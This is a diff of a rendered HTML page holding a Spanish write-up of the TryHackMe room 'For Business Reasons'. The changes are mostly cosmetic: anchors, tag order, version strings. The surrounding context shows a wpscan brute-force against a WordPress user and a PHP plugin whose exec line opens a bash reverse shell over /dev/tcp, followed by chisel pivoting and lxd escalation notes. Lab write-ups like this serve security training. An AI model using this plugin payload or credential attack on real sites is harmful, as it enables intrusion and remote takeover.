@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,11 +1578,11 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/wpscan/" class="single__tag" title="wpscan">#wpscan</a></li>
+
   <li><a href="https://sckull.github.io/tags/docker/" class="single__tag" title="docker">#docker</a></li>
 
   <li><a href="https://sckull.github.io/tags/chisel/" class="single__tag" title="chisel">#chisel</a></li>
-
-  <li><a href="https://sckull.github.io/tags/wpscan/" class="single__tag" title="wpscan">#wpscan</a></li>
 
   <li><a href="https://sckull.github.io/tags/lxd/" class="single__tag" title="lxd">#lxd</a></li>
 
@@ -1630,7 +1630,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="nmap">NMAP</h2>
+<h2 id="nmap-">NMAP</h2>
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto, desconocido (7946) y el puerto ssh (22) aparentemente cerrado.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1692,10 +1692,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Sat Sep 19 21:22:13 2020 -- 1 IP address (1 host up) scanned in 21.70 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http">HTTP</h2>
+</div><h2 id="http-">HTTP</h2>
 <p>Encontramos una pagina web WordPress en el puerto 80.<br />
 <img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_192832.png" alt="image" /></p>
-<h2 id="rustbuster">RUSTBUSTER</h2>
+<h2 id="rustbuster-">RUSTBUSTER</h2>
 <p>Utilizamos RUSTBUSTER para busqueda de directorios y archivos, en donde podemos observar varias direcciones las cuales se muestran diferentes a lo normal pero que son direcciones no disponibles.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1978,7 +1978,7 @@ GET     <span class="m">405</span> Method Not Allowed          http://10.10.141.
     codetabContents[0].style.display = 'block';
   }
 </script>
-<h2 id="wpscan">WPSCAN</h2>
+<h2 id="wpscan-">WPSCAN</h2>
 <p>Utilizamos wpscan para busqueda de vulnerabilidades y usuarios en la pagina de wordpress en donde encontramos un usuario: <code>sysadmin</code> y la version de wordpress. Con el usuario ejecutamos un ataque de fuerza bruta junto al wordlist <code>rockyou</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2027,7 +2027,7 @@ GET     <span class="m">405</span> Method Not Allowed          http://10.10.141.
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_194107.png" alt="image" /></p>
-<h2 id="www-data">WWW-DATA</h2>
+<h2 id="www-data-">WWW-DATA</h2>
 <p>Utilizamos las credenciales que encontramos en wpscan para ingresar a wordpress, en donde vemos que el usuario <code>sysadmin</code> es administrador. Para obtener una shell creamos un &ldquo;plugin&rdquo; el cual se ejecuta cuando este es activado o desactivado en el panel de <strong>Plugins</strong>. Para la creacion de nuestro plugin utilizamos el siguiente archivo php el cual comprimimos con zip.</p>
 <p><strong>Usuario Administrador</strong><br />
 <img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_195000.png" alt="image" /></p>
@@ -2048,7 +2048,7 @@ GET     <span class="m">405</span> Method Not Allowed          http://10.10.141.
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php:shell.php" data-lang="php:shell.php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma"><code class="language-php:shell.php" data-lang="php:shell.php"><span class="cp">&lt;?php</span>
 
 <span class="sd">/**
 </span><span class="sd">* Plugin Name: Reverse Shell Plugin
@@ -2060,8 +2060,8 @@ GET     <span class="m">405</span> Method Not Allowed          http://10.10.141.
 </span><span class="sd">*/</span>
 
 <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8080 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2076,7 +2076,7 @@ GET     <span class="m">405</span> Method Not Allowed          http://10.10.141.
 <img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_195221.png" alt="image" /><br />
 <img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_195604.png" alt="image" /><br />
 <img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_195844.png" alt="image" /></p>
-<h2 id="docker--chisel">DOCKER &amp; CHISEL</h2>
+<h2 id="docker--chisel-">DOCKER &amp; CHISEL</h2>
 <p>En la maquina no logramos encontrar algun tipo de binario, archivo, cron o usuario que nos ayude a escalar privilegios ya que el lugar donde nos encontramos es un contenedor de docker. Lo mencionaron en el archivo <code>notes.txt</code>, para comprobar esto es posible ver el directorio <code>/</code> donde comunmente se encuentra el archivo <code>.dockerenv</code>, además de ello en la carpeta de wordpress (<code>/var/www/html</code>) encontramos un archivo de docker que contiene la configuracion para que wordpress se ejecute en un contenedor, tambien encontramos que muchos de los comandos que comunmente se encuentran en una maquina en linux no existen.</p>
 <p><strong>Docker</strong><br />
 <img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_200921.png" alt="image" /><br />
@@ -2208,10 +2208,10 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::8181       
 kali@kali:~/thm/bussiness$
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="sysadmin---user">SYSADMIN - USER</h2>
+</div><h2 id="sysadmin---user-">SYSADMIN - USER</h2>
 <p>Reutilizando las credenciales del usuario <code>sysadmin</code> ingresamos al servicio SSH de la maquina bussines.thm mediante el puerto local 2222. Logrando obtener una shell con este usuario y nuestra flag <code>flag1.txt</code>.<br />
 <img src="/images/posts/thm/forbusinessreason/Screenshot_20200919_204038.png" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Hacemos una pequeña enumeracion con <code>id</code> y vemos que el usuario pertenece al grupo de <code>lxd</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -3612,7 +3612,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3660,14 +3660,14 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#nmap">NMAP</a></li>
-        <li><a href="#http">HTTP</a></li>
-        <li><a href="#rustbuster">RUSTBUSTER</a></li>
-        <li><a href="#wpscan">WPSCAN</a></li>
-        <li><a href="#www-data">WWW-DATA</a></li>
-        <li><a href="#docker--chisel">DOCKER &amp; CHISEL</a></li>
-        <li><a href="#sysadmin---user">SYSADMIN - USER</a></li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#nmap-">NMAP</a></li>
+        <li><a href="#http-">HTTP</a></li>
+        <li><a href="#rustbuster-">RUSTBUSTER</a></li>
+        <li><a href="#wpscan-">WPSCAN</a></li>
+        <li><a href="#www-data-">WWW-DATA</a></li>
+        <li><a href="#docker--chisel-">DOCKER &amp; CHISEL</a></li>
+        <li><a href="#sysadmin---user-">SYSADMIN - USER</a></li>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
       </ul>
     </li>
   </ul>
